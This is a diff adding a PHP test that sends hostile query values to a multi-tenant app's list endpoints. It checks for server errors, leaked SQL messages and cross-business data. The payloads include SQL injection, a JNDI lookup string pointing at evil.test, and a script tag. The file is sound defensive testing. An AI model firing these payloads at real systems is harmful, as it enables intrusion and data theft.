@@ -168,3 +168,40 @@ test('nothing of another business shows up in the lists of the app', function ()
 
     expect($problems)->toBe([]);
 });
+
+test('hostile input in the query never breaks a list, leaks SQL or reaches another business', function (): void {
+    $lists = ['customers', 'conversations', 'services', 'products', 'team', 'agenda', 'business/closures', 'support',
+        'payments', 'notifications', 'digests', 'account/devices'];
+    $hostile = [
+        "' OR 1=1 --",
+        '"; DROP TABLE users; --',
+        '%',
+        '_',
+        '\\',
+        "\0",
+        str_repeat('a', 6000),
+        '💥 ñandú',
+        '${jndi:ldap://evil.test/x}',
+        '<script>alert(1)</script>',
+    ];
+    $problems = [];
+
+    foreach ($lists as $list) {
+        foreach ($hostile as $value) {
+            // Every key a list might read, all at once: the point is that none of them is trusted.
+            $query = http_build_query(['search' => $value, 'q' => $value, 'filter' => $value, 'page' => $value, 'cursor' => $value, 'before' => $value, 'day' => $value]);
+            $response = asIsolationApp($this->owner, 'GET', "/api/v1/{$list}?{$query}");
+            $label = "/{$list} with ".json_encode(mb_substr($value, 0, 20));
+
+            if ($response->status() >= 500) {
+                $problems[] = "{$label} answered {$response->status()}";
+            } elseif (preg_match('/SQLSTATE|syntax error|Illuminate\\\\|vendor\/|Stack trace/i', $response->getContent()) === 1) {
+                $problems[] = "{$label} leaked an internal message";
+            } elseif (str_contains($response->getContent(), 'SECRETO-B')) {
+                $problems[] = "{$label} shows another business's data";
+            }
+        }
+    }
+
+    expect($problems)->toBe([]);
+});
